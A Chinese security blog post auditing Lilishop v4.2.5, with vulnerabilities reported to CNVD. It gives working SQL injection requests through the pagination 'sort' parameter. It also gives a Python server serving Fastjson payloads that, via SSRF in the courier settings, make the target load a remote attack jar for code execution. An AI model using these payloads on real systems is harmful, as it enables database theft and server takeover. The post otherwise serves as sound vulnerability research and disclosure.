---
title: Lilishop 开源商城系统代码审计
date: '2023-07-24 15:52:16'
updated: '2024-09-23 21:58:30'
abbrlink: c899d684
---
<!--more--> 
# 0x00 前言
Lilishop 开源商城系统是基于SpringBoot的全端开源电商商城系统，是北京宏业汇成科技有限公司提供的开源系统。该开源商城包含的功能点多，涵盖业务全面，代码审计时没有过于关注业务逻辑只关注了对系统的完整性、保密性、可用性造成损坏的漏洞点。文章分享了比较有意思的SSRF利用方式。

# 0x01 声明
**遵纪守法**

公网上存在部署了旧版本的CMS，旧版本仍然存在这些问题。

请不要非法攻击别人的服务器，如果你是服务器主人请升级到最新版本。

请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。  
一切未经授权的网络攻击均为违法行为，互联网非法外之地。

**漏洞报送**

该文章涉及的漏洞已提交到CNVD、CNNVD平台。

**文章转载**

商业转载请联系作者获得授权，非商业转载请注明出处。

作者公众号：响尾蛇社区

# 0x02 环境
Lilishop 开源商城系统版本：v4.2.5

系统环境：Window11

JAVA版本：1.8.0_381

Nodejs版本：v14.21.3

# 0x03 安装
搭建该系统需要配置内存大于或等于32GB，需要部署买家、卖家、商城管理三端，分别有前后端，一共六个服务。

参考：[https://docs.pickmall.cn/deploy/win/deploy.html](https://docs.pickmall.cn/deploy/win/deploy.html)

拉取后端源码

```plain
git clone -b v4.2.5 --single-branch https://gitee.com/beijing_hongye_huicheng/lilishop.git
```

拉取前端源码

```plain
git clone -b v4.2.5 --single-branch https://gitee.com/beijing_hongye_huicheng/lilishop-ui.git
```

前端源码初始化并运行

```plain
npm install yarn
yarn install 
yarn run dev
```

在安装过程中我需要了下面的报错问题。

![](../../images/posts/3823075d57a2e0b0288817983a326702.png)

解决命令如下：

```plain
yarn remove webpack
yarn remove compression-webpack-plugin
yarn add webpack@^4.36.0
yarn add compression-webpack-plugin@^6.0.5
```

# 0x04 代码审计
## 【高危】分页插件导致数十个SQL注入
这里的SQL注入漏洞点都是由一个地方导致的，漏洞注入的地方为`order by`，依据 Mybatis 特性不能多行执行，且存在函数黑名单，所以利用上有限。

### 漏洞复现
#### 【前台】漏洞位置：获取APP版本
 构造数据包：

```plain
GET /buyer/other/appVersion/appVersion/ANDROID?pageNumber=1&pageSize=5&type=ANNOUNCEMENT&sort=updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0x7e),1)&order=desc HTTP/1.1
Host: localhost:8888
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
uuid: 522c39df-cd28-4edd-a46e-4d38b717554e
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:10000
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:10000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

![](../../images/posts/7941a0565af4a7cb2b9c0b7797ebd156.png)

后台查看SQL执行情况：

![](../../images/posts/0661f0b4b83ce853c05560a069b110e7.png)

预编译的SQL语句为：

```plain
SELECT id, create_time, create_by, version, version_name, content, force_update, download_url, type, version_update_date FROM li_app_version WHERE (type = ?) ORDER BY updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) DESC LIMIT ?
```

除了报错注入，我们还可以使用布尔方式进行注入：

语句是获取所有表名并使用`group_concat`将所有表名合成一行字符串输出，我们通过这种布尔的方式可以逐步爆破出所有的表名。

```plain
1-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=73,1,(select 1 union select 2))
```

如果字符串第一位不是为ascii码中的73就会出现以下报错。

![](../../images/posts/258327f45606a799fdf5b9f756c4cb12.png)

```plain
1-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=108,1,(select 1 union select 2))
```

正确后正常返回数据。

![](../../images/posts/a8fba323dbb8cc5f43771dd1b3ff6f6e.png)

#### 【后台】漏洞位置：计量单位
访问 [http://localhost:10003/goodsUnit](http://localhost:10003/goodsUnit) 登录后台并进入到`商品->计量单位`界面。![](../../images/posts/662d9a793f3a0b7b0ccbafc93c80e67f.png)

抓包并修改`sort`参数为 payload：

```plain
updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0x7e),1)
```

```plain
GET /manager/goods/goodsUnit?_t=1690460576&pageNumber=1&pageSize=10&sort=updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0x7e),1)&order=desc&name= HTTP/1.1
Host: localhost:8887
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
accessToken: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyQ29udGV4dCI6IntcInVzZXJuYW1lXCI6XCJhZG1pblwiLFwibmlja05hbWVcIjpcIuWIneS4gFwiLFwiZmFjZVwiOlwiaHR0cHM6Ly9saWxpc2hvcC1vc3Mub3NzLWNuLWJlaWppbmcuYWxpeXVuY3MuY29tLzY1ZTg3ZmZhNzE4YjQyYmI5YzIwMTcxMjU2NmRiYzlhLnBuZ1wiLFwiaWRcIjpcIjEzMzczMDYxMTAyNzc0NzYzNTJcIixcImxvbmdUZXJtXCI6ZmFsc2UsXCJyb2xlXCI6XCJNQU5BR0VSXCIsXCJpc1N1cGVyXCI6dHJ1ZX0iLCJzdWIiOiJhZG1pbiIsImV4cCI6MTY5MDQ2MjI5OX0.3R2xS64WcysJVEJwnVpOZwLqMsMVGwYtuD9Y7qQIyYE
uuid: 41e9b550-5ee8-4db1-9533-129a5492af48
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:10003
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:10003/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

![](../../images/posts/bdf161d70cc0a5f7e739403d25162c45.png)

后台查看SQL执行情况：

![](../../images/posts/0ddda5faba4e5157d70cddd4ce8e155d.png)

预编译的SQL语句为：

```plain
SELECT id, name, create_by, create_time, update_by, update_time, delete_flag FROM li_goods_unit ORDER BY updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) DESC LIMIT ?
```

更多的利用方式：[常见的sql注入方式和waf绕过 - sp4rk’s blog](https://sp4rk.win/2018/03/20/%E5%B8%B8%E8%A7%81%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%E5%92%8Cwaf%E7%BB%95%E8%BF%87-%E4%BB%85%E4%BB%A5%E7%A9%BA%E6%A0%BC%E4%B8%BA%E4%BE%8B-%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/)

默认开启Druid拦截功能：[Druid拦截功能的配置与简单绕过](https://mp.weixin.qq.com/s/lGalf63VXCva2I5BpmSMgQ)

拦截功能配置：[配置 wallfilter](https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE-wallfilter)

 默认函数黑名单：

![](../../images/posts/60243be202c3ca5df86541cda296a944.png)

### 漏洞分析
 其中的`initPage`函数处理中使用了`addOrder`但是没有对`sort`进行SQL语句过滤。

`framework/src/main/java/cn/lili/mybatis/util/PageUtil.java`

![](../../images/posts/2828339a3270ce7772a521f92253a5c6.png)

全局搜索`PageUtil.initPage`

![](../../images/posts/cc1d23c6faac33f50563754d4d50aeec.png)

根据spring自动绑定的特性，若此时加入orders参数的传递，同样的后端会进行对应的实体封装，最终带入到sql查询中，同时因为order by场景下MybatisPlus并没有相关的安全措施 ，会导致SQL注入风险。

通过这种请求入口，自动获取`order`和`sort`字段。以下是其中一个。

`manager-api/src/main/java/cn/lili/controller/goods/GoodsUnitManagerController.java`

![](../../images/posts/76d5bc8be4f386872848d6ae6952ce07.png)

断点测试时，发现存在恶意的`sort`内容被保留，并在后续拼接到预编译SQL语句。

![](../../images/posts/7e78fac8f30d003a70044d81e828bcee.png)

关于分页插件注入更多信息请查看：[SecIN](https://www.sec-in.com/article/1088)

## 【高危】SSRF导致FastJson反序列化RCE
### 漏洞复现
我们准备一个返回FastJson payload 的响应数据包。

这里我从Maven拉取的Fastjson版本较高1.2.78（依据`framework/pom.xml`自动拉取）

![](../../images/posts/365ddcc39fbeb327fd88f5cf1779cf14.png)

我选择使用 payload

```python
{"@type":"java.net.InetSocketAddress"{"address":,"val":"z1vpgb.dnslog.cn"}}{% endraw %}
```

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

# 创建一个自定义的HTTP请求处理类
class MyHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # 设置响应头
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

        # 处理POST请求的逻辑
        if self.path == '/getmsg':
            # 在这里编写处理POST请求的代码
            # 例如，您可以从请求中获取数据，进行处理，然后返回响应数据
            response_data = '{"@type":"java.net.InetSocketAddress"{"address":,"val":"z1vpgb.dnslog.cn"}}{% endraw %}'
            self.wfile.write(response_data.encode())
        else:
            # 如果请求路径不是'/getmsg'，返回404 Not Found
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')

# 启动HTTP服务器并监听指定端口
def start_http_server(port=14533):
    server_address = ('', port) 
    httpd = HTTPServer(server_address, MyHTTPRequestHandler)
    print(f"Starting HTTP server on port {port}...")
    try:
        # 启动HTTP服务器，等待请求
        httpd.serve_forever()
    except KeyboardInterrupt:
        # 捕捉Ctrl+C退出信号，关闭HTTP服务器
        httpd.server_close()
        print("\nHTTP server stopped.")

if __name__ == '__main__':
    # 启动HTTP服务器并监听端口8000
    start_http_server()

```

> 更多的payload：[GitHub - safe6Sec/Fastjson: Fastjson姿势技巧集合](https://github.com/safe6Sec/Fastjson)
>

使用python运行该文件并进入到运营后台 http://localhost:10003/sys/setting

#### 查看物流处利用
`设置->系统设置->快递鸟设置`将`reqURL`修改成`http://127.0.0.1:14533/getmsg`

![](../../images/posts/6808531dd5048a6f684fc6668ba69674.png)

准备好这个之后，我们有很多出地方可以出发这个请求。

比如这里是商家查看获取物流，我们还可以在买家端、运营端找到这个功能。

这里是需要存在一个订单处于已发货状态。

![](../../images/posts/22650be1cf1f7b67acdee21c819a295c.png)

当我们点击后在`dnslog.cn`可以获得解析记录。

![](../../images/posts/b0dc42886d6533b707f7ef4ee6881756.png)

Fastjson <= 1.2.80 可以打三种不同的利用链，这里我发现存在其中一种利用链`groovy`。

`org.codehaus.groovy.control.CompilationFailedException`

![](../../images/posts/44afc776166959e996d5de72451f9441.png)

改写我们的Exp python文件。

```python
...

        # 处理POST请求的逻辑
        if self.path == '/getmsg':
            # 在这里编写处理POST请求的代码
            # 例如，您可以从请求中获取数据，进行处理，然后返回响应数据
            # response_data = '{"@type":"java.net.InetSocketAddress"{"address":,"val":"z1vpgb.dnslog.cn"}}{% endraw %}'
            response_data1 = "{\n" \
                "  \"@type\":\"java.lang.Exception\",\n"  \
                "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" \
                "  \"unit\":{\n" \
                "  }\n" \
                "}"
            response_data2 = "{\n" \
                        "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" \
                        "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" \
                        "  \"config\":{\n" \
                        "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" \
                        "    \"classpathList\":[\"http://127.0.0.1:35260/attack-1.jar\"]\n" \
                        "  },\n" \
                        "  \"gcl\":null,\n" \
                        "  \"destDir\": \"/tmp\"\n" \
                        "}";
            # self.wfile.write(json.dumps(response_data1).encode())
            self.wfile.write(response_data1.encode())
...
```

这里有两步请求 payload ：

1. 实例化org.codehaus.groovy.control.ProcessingUnit并把org.codehaus.groovy.control.ProcessingUnit加入反序列化缓存。

```python
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
```

2. 通过<font style="color:rgb(51, 51, 51);">GroovyClassLoader加载恶意Class</font>

```python
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://127.0.0.1:35260/attack-1.jar"
    }
}
```

下载 [GitHub - Lonely-night/fastjsonVul: fastjson 80 远程代码执行漏洞复现](https://github.com/Lonely-night/fastjsonVul)

修改`attack/src/main/java/groovy/grape/GrabAnnotationTransformation2.java`

修改默认执行命令，我使用的是window环境，所以修改成`calc.exe`

![](../../images/posts/3ae346f98c95e7e2aaa2b19e037acdbe.png)

通过`maven package`打包成 jar，然后到jar的目录下执行`python -m http.server 35260`

接下来分别让FastJson解析两个payload后就执行了我们想要的命令。

![](../../images/posts/85313bd2dc9bdc78c354b6060b9c9a37.png)

总的过程：

1. 运营后台修改`reqURL`
2. 启动 python 脚本进行监听
3. 点击查看物流
4. 编辑 python 脚本切换 payload 并启动监听
5. 恶意jar目录下启动python http服务监听
6. 点击查看物流
7. Boom！

![](../../images/posts/c9d2c9c2da0715f7b20e8b488c32a457.gif)

> 参考资料：
>
> [fastjson 1.2.80绕过简单分析 - rnss - 博客园](https://www.cnblogs.com/rnss/p/16738100.html)
>
> [fastjson 1.2.80 漏洞分析](https://y4er.com/posts/fastjson-1.2.80/)
>
> [Fastjson 漏洞梳理](https://www.rc.sb/fastjson/)
>

#### 打印电子面单处利用
`设置->系统设置->快递鸟设置`将`电子面单URL`修改成`http://127.0.0.1:14533/getmsg`

![](../../images/posts/533bcc7ed194a6eb469e733a61445adb.png)

保存后，我们登录商家端，在`订单->商品订单`找一个待发货的订单，进入订单详情后，点击`打印电子面单`然后点击确认。

![](../../images/posts/d3c9828ea23434d32b28a9bd6613fda2.png)

脚本可以收到请求信息

![](../../images/posts/accb42e17b2c3d2a982f52f475250eac.png)

按照上面发送两个请求后一样能够RCE。

![](../../images/posts/fe9a215587baea9658095f7f04913f37.png)

### 漏洞分析
#### 查看物流处利用
发现`getOrderTracesByJson`函数中存在两行代码：

```python
String result = sendPost(ReqURL, params);
Map map = (Map) JSON.parse(result);
```

其作用是对`ReqURL`发起Post请求，然后将返回的内容交给FastJson的JSON.parse函数，即将返回的JSON内容转换成Java对象。

`framework/src/main/java/cn/lili/modules/system/serviceimpl/LogisticsServiceImpl.java`

![](../../images/posts/8de51d34df68096031baeb7d2b1c5d92.png)

这里的`ReqURL`是由快递鸟设置的。

![](../../images/posts/16791ce1056dcb2932ed1fcf8599f961.png)

只有同一文件中的函数`getLogistic`调用了它。

![](../../images/posts/acdde4a8f39ed1633f5affbad7c6970a.png)

但它存在两个用法，分别是`AfterSaleServiceImpl`和`OrderServiceImpl`，分别是查看订单里的查看物流功能和退货后里的查看物流功能，总共有五处可以触发该功能。

![](../../images/posts/0fe44b6449925c3944d9fe9c8f8e5052.png)

查看物流实现的是`getTraces`接口。

`framework/src/main/java/cn/lili/modules/order/order/serviceimpl/OrderServiceImpl.java`

![](../../images/posts/20b5eb3571665f47acd0f75b49a3be20.png)

有三处调用，分别是买家、运营、商家。

![](../../images/posts/7c2fbaf803aa8025057e478daaae2775.png)

#### 打印电子面单处利用
`framework/src/main/java/cn/lili/modules/kdBrid/serviceImpl/KdNiaoServiceImpl.java`

![](../../images/posts/76ac95be41847b33959291ff48cdc82d.png)

![](../../images/posts/a6e05e5f3fd2f6832b1c87e21dd378d6.png)

`seller-api/src/main/java/cn/lili/controller/order/OrderStoreController.java`

![](../../images/posts/c8a8c1db2cb2373641f5d40507fd9765.png)

总的来说，需要完成此RCE需要运营权限，需要存在一个待发货或者已发货订单，需要一台VPS，需要对方服务器能够出网。是一个后台的RCE漏洞，相对来说利用复杂度高。

## 【低危】商家后台添加商品处SSRF
漏洞出现的原因是没有对数据包中的图片网络地址进行校验，构造了GET请求。从具体来看，这里只能执行HTTP、HTTPS的协议且没有回显，能利用的范围极其有限。

### 漏洞复现
我们先在运营后台[http://localhost:10003/sys/authLogin](http://localhost:10003/sys/authLogin)

`设置->信任登录`填写好appid和appSecret。![](../../images/posts/4d3e64afc7045bb4bd6afe0e6074e80f.png)

然后进入卖家后台[http://localhost:10002/liveGoods](http://localhost:10002/liveGoods)

`营销->直播商品`选择添加商品，任意选择商品点击确定。

![](../../images/posts/e3d0da70a6fb67cf6242b9fecd46c1bd.png)

抓包后修改`goodsImage`参数即可。

![](../../images/posts/e7811a9a92e50d2f94afb8a0652a7d1e.png)

监听的服务能够接收到请求。

![](../../images/posts/ff294e677d296c6077c105387c7a9213.png)

请求数据包：

```plain
POST /store/broadcast/commodity HTTP/1.1
Host: localhost:8889
Content-Length: 280
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
accessToken: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyQ29udGV4dCI6IntcInVzZXJuYW1lXCI6XCIxMzAxMTExMTExMVwiLFwibmlja05hbWVcIjpcIuW8oOS4iVwiLFwiZmFjZVwiOlwiaHR0cHM6Ly9saWxpc2hvcC1vc3Mub3NzLWNuLWJlaWppbmcuYWxpeXVuY3MuY29tLzE1OGJmZjgzMWNmZjQ5OWE4ZDQ1YTIyNmE2ZTAyMGMyLnBuZ1wiLFwiaWRcIjpcIjEzNzY0MTc2ODQxNDAzMjY5MTJcIixcImxvbmdUZXJtXCI6ZmFsc2UsXCJyb2xlXCI6XCJTVE9SRVwiLFwic3RvcmVJZFwiOlwiMTM3NjQzMzU2NTI0NzQ3MTYxNlwiLFwiY2xlcmtJZFwiOlwiMTM3NjQzMzU2NTI0NzQ3MTYxNlwiLFwic3RvcmVOYW1lXCI6XCLlrrblrrbkuZBcIixcImlzU3VwZXJcIjp0cnVlfSIsInN1YiI6IjEzMDExMTExMTExIiwiZXhwIjoxNjkwNDU4ODM5fQ.Ewl3h-FG0X46mhJWPS3ZKDvsOMmtwyuDtSM1wbr8umk
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
uuid: 4cbd68bb-d1cd-4763-b74e-961dc910f418
sec-ch-ua-platform: "Windows"
Origin: http://localhost:10002
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:10002/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

[
  {
    "goodsId": "1422073672823595010",
    "goodsImage": "http://127.0.0.1:4567",
    "name": " OPPO Reno6 5G 星黛紫 8G+128G 64G",
    "price": 4999,
    "quantity": 95,
    "price2": "",
    "priceType": 1,
    "skuId": "1422073673050087425",
    "url": "pages/product/goods?id=1422073673050087425&goodsId=1422073672823595010"
  }
]
```

**后续利用**

受到[CVE-2021-21287: 容器与云的碰撞——一次对MinIO的测试](https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html)的启发，如果目标机器存在docker 2375端口监听且没有设置验证密码的情况下，我们可以通过SSRF请求2375的`/build`完成Build an image功能。挂载到特殊目录完成GetShell（只适合Linux系统）。

[Docker Engine API v1.41 Reference](https://docs.docker.com/engine/api/v1.41/#tag/Image/operation/ImageBuild)

![](../../images/posts/1bfcc5ef9648964169ad53b1eec2bd5b.png)

> 如果出现开启但是没有监听可以通过游览这个页面解决
>
> [https://github.com/docker/for-win/issues/3546](https://github.com/docker/for-win/issues/3546)
>

### 漏洞分析
`framework/src/main/java/cn/lili/modules/goods/util/WechatMediaUtil.java`

![](../../images/posts/991ce3d2ac18c699af507a82dfce9056.png)

`framework/src/main/java/cn/lili/modules/goods/util/WechatLivePlayerUtil.java`

![](../../images/posts/d97447ca156e26cb6927baa563eb96ec.png)

`framework/src/main/java/cn/lili/modules/goods/serviceimpl/CommodityServiceImpl.java`

![](../../images/posts/ea785d3fe240af25a7952a3687113414.png)

`seller-api/src/main/java/cn/lili/controller/other/broadcast/CommodityStoreController.java`

![](../../images/posts/3ab2624f8638c9ad39644099089025bb.png)

# 0x05 总结
在审计SpringBoot框架的代码时，我主要从高危漏洞入手，一般关注注入漏洞比较多。在实践过程中，大部分的业务点不会涉及到远程加载未验证类的情况，存在RCE的地方一般会伴随反序列化。

